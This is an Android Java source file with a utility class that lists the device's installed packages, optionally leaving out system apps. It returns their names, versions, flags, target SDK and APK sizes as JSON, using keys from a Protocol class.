package com.fason.app.features.apps;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.List;

public final class AppList {

    private AppList() {}

    public static JSONObject get(boolean includeSystem) {
        JSONObject result = new JSONObject();
        JSONArray apps = new JSONArray();

        try {
            result.put(Protocol.KEY_APPS, apps);

            PackageManager pm = FasonApp.getContext().getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);

            for (PackageInfo pkg : packages) {
                try {
                    ApplicationInfo info = pkg.applicationInfo;
                    boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;

                    if (!includeSystem && isSystem) continue;

                    JSONObject app = new JSONObject();
                    app.put(Protocol.KEY_APP_NAME, info.loadLabel(pm).toString());
                    app.put(Protocol.KEY_PACKAGE_NAME, pkg.packageName);
                    app.put(Protocol.KEY_VERSION_NAME, pkg.versionName != null ? pkg.versionName : "");
                    app.put(Protocol.KEY_VERSION_CODE, pkg.getLongVersionCode());
                    app.put(Protocol.KEY_IS_SYSTEM, isSystem);
                    app.put(Protocol.KEY_ENABLED, info.enabled);
                    app.put(Protocol.KEY_TARGET_SDK, info.targetSdkVersion);

                    try {
                        String src = info.sourceDir;
                        if (src != null) {
                            app.put(Protocol.KEY_SIZE, new File(src).length());
                        }
                    } catch (Exception ignored) {}

                    apps.put(app);
                } catch (Exception ignored) {}
            }

            result.put(Protocol.KEY_TOTAL, apps.length());
        } catch (Exception e) {
            try { result.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }

        return result;
    }
}
